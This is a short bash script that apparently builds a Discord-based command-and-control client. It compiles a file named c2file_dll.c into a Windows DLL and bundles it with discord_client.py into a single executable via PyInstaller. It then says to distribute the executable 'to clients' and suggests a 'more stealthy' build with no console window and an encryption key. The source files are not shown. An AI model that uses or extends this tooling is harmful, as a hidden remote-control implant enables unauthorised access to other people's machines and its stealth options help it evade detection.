#!/bin/bash
/usr/bin/i686-w64-mingw32-gcc -shared c2file_dll.c -o c2file.dll
python3 -m PyInstaller --target-architecture amd64 --onefile -F -r c2file.dll discord_client.py
echo '[=] Complete. Distribute dist/discord_client.exe to clients as required.'
echo '-----------------------'
echo '|        NOTE         |'
echo '----------------------'
echo 'This is compiled unobfuscated. To create a more stealthy version, use:'
echo 'python -m PyInstaller --no-console --key=SomeSixteenChars -F -r c2file.dll discord_client.py'
echo